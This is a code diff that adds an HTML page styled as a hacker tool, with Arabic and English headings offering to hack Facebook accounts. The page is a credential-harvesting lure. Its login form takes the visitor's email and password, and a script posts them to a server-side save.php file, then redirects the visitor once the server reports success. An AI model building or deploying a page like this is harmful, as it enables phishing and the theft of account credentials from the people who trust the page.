@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login Page</title>
+  <style>
+    /* Background characters */
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      justify-content: flex-start;
+      background-color: black;
+    }
+    
+     .characters {
+       display: flex;
+       flex-wrap: nowrap;
+       position: absolute;
+       top: 0;
+       left: 0;
+       z-index: -1;
+       width: 100vw;
+     }
+   
+     .column {
+       display: flex;
+       flex-direction: column-reverse;
+       align-items: flex-start;
+       margin-right: 20px;
+     }
+   
+     .character {
+       color: #00FF00;
+       animation: moveCharacter linear infinite;
+     }
+   
+     @keyframes moveCharacter {
+       0% {
+         transform: translateY(-10vh);
+         opacity: 1;
+       }
+   
+       100% {
+         transform: translateY(110vh);
+         opacity: 0;
+       }
+     }
+     
+      .container {
+      margin-top: 30px;
+      margin-left: 120px;
+      width: 300px;
+      padding: 20px;
+      background-color: white;
+      border-radius: 8px;
+      box-shadow: 0 10px 50px red;
+      text-align: center;
+    }
+
+    input {
+      width: calc(100% - 16px);
+      margin-bottom: 10px;
+      padding: 8px;
+      border-radius: 4px;
+      border: 1px solid #ccc;
+      box-sizing: border-box;
+    }
+
+    button {
+      width: calc(100% - 16px);
+      padding: 8px;
+      border-radius: 4px;
+      border: none;
+      background-color: #007bff;
+      color: #fff;
+      cursor: pointer;
+      box-sizing: border-box;
+    }
+
+    .img {
+      box-shadow: 1px 5px 15px red;
+      border: 2px solid #00FF00;
+      border-radius: 20px;
+      margin-top: 100px;
+      width: 60%;
+      height: 150px;
+      margin-left: 45%;
+    }
+
+ #introText{
+      color: gold;
+      font-size: 17px;
+      font-family: monospace;
+      overflow: hidden;
+      white-space: nowrap;
+      margin-top: 10px;
+      margin-bottom: 10px;
+      position: absolute;
+      top: 0;
+      left: 100%;
+      transform: translateX(-50%);
+    }
+     @keyframes typing {
+      from {
+        width: 0;
+      }
+      to {
+        width: 100%;
+      }
+      animation-duration: 3s; 
+    }
+
+    @keyframes erasing {
+      from {
+        width: 100%;
+      }
+      to {
+        width: 0;
+      }
+      animation-duration: 2s; 
+    }
+
+
+    
+      </style>
+</head>
+<body>
+   <div id="introText">
+    <h2>اختراق حسابات فيسبوك</h2>
+  </div>
+
+  <div class="characters">
+    <div class="column"></div>
+    <div class="column"></div>
+    <div class="column"></div>
+    <div class="column"></div>
+    <div class="column"></div>
+    <div class="column"></div>
+    <div class="column"></div>
+    <div class="column"></div>
+    <div class="column"></div>
+    <div class="column"></div>
+    <div class="column"></div>
+    <div class="column"></div>
+    <div class="column"></div>
+    <div class="column"></div>
+    <div class="column"></div>
+    <div class="column"></div>
+    <div class="column"></div>
+
+  </div>
+
+ 
+  <img class="img" src="logoo.jpeg" alt="photo logo" style="">
+
+  <div class="container">
+    <h2>Login</h2>
+    <form onsubmit="saveData(event)">
+      <input type="email" name="username" id="username" placeholder="Username" required>
+      <input type="password" name="password" id="password" placeholder="Password" required>
+      <button type="submit">Login</button>
+    </form>
+    <h4>Hack Facebook Account online</h4>
+
+    <p id="result"></p>
+  </div>
+
+
+
+
+
+  <script>
+    function saveData(event) {
+      event.preventDefault();
+
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+
+      // إنشاء كائن FormData لنقل البيانات إلى صفحة PHP
+      const formData = new FormData();
+      formData.append('username', username);
+      formData.append('password', password);
+
+      fetch('save.php', {
+        method: 'POST',
+        body: formData
+      })
+      .then(response => response.text())
+      .then(data => {
+        document.getElementById('result').innerText = data; 
+
+        if (data === 'البيانات صحيحة!') {
+          document.getElementById('username').value = '';
+          document.getElementById('password').value = '';
+
+            window.location.href = "22.html";
+         
+        }
+      })
+      .catch(error => {
+        console.error('Error:', error);
+      });
+    }
+  </script>
+  
+   <script>
+    const columns = document.querySelectorAll('.column');
+    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-=_+[]{}|;:,.<>?';
+
+    function createCharacter() {
+      const character = document.createElement('span');
+      character.textContent = characters.charAt(Math.floor(Math.random() * characters.length));
+      character.classList.add('character');
+      character.style.animationDuration = `${Math.random() * 5 + 2}s`;
+      return character;
+    }
+
+    for (let column of columns) {
+      for (let i = 0; i < 50; i++) {
+        column.appendChild(createCharacter());
+      }
+    }
+  </script>
+  <script>
+    const textElement = document.getElementById('introText');
+    const text = textElement.textContent.trim();
+    let isTyping = true;
+
+    function displayText() {
+      textElement.style.animation = 'typing 5s steps(40, end) forwards';
+      setTimeout(eraseText, 8000);
+    }
+
+    function eraseText() {
+      textElement.style.animation = 'erasing 3s steps(40, end) forwards';
+      setTimeout(displayText, 4000); 
+    }
+    displayText();
+  </script>
+</body>
+</html>
